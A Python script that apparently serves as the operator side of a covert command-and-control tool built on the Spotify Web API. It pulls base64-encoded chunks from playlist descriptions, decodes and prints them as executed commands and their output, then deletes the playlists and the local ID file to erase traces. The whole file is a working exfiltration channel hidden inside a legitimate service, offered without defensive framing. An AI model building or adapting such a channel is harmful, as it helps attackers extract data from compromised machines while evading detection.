import json
import random 
import requests
import base64
import itertools
import os

#Get auth token
headers = {
    'Authorization': 'Basic <base64 clientid:secret>',
}

data = {
  'grant_type': 'refresh_token',
  'refresh_token': '<refresh token>'
}

response = requests.post('https://accounts.spotify.com/api/token', headers=headers, data=data)

js_response = response.json()

access_token = js_response['access_token']

headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + access_token,
}

#Get description from each playlist and decode the base64
offset = 0
plsize = 50
while(plsize == 50):
	response = requests.get('https://api.spotify.com/v1/me/playlists?limit=50&offset=' + str(offset), headers=headers)
	offset = offset + 51
	js_r = response.json()

	plsize = len(js_r['items'])

	playlist_desc = []
	playlist_command = []

	content = [line.rstrip('\n') for line in open('playlist_id_list.txt')]

	cnt = 0
	for lines in content:
		line = lines.split(",")
		for i in range(0, plsize):
			if (js_r['items'][i]['id'] == line[0]):
				playlist_desc.append([js_r['items'][i]['description']])
				playlist_command.append(line[1])
				found = 1
				for j in range(1, 100):
					if (found == 0):
						break
					for k in range(0, plsize):
						if (js_r['items'][k]['name'] == (line[0] + str(j))):
							playlist_desc[cnt].append(js_r['items'][k]['description'])
							break
						if(k == (plsize-1)):
							found = 0
			del_playlist = js_r['items'][i]['id']
			response = requests.delete('https://api.spotify.com/v1/playlists/' + del_playlist + '/followers', headers=headers)
		cnt = cnt + 1


	for (enc_chunk, command) in zip(playlist_desc, playlist_command):
		enc = "".join(enc_chunk)
		b64_bytes = enc.encode('ascii')
		output_bytes = base64.b64decode(b64_bytes)
		output = output_bytes.decode('ascii')
		print("##########Command Executed##########\n")
		print(command)
		print("\n##########Output##########\n")
		print(output)

os.remove("playlist_id_list.txt")


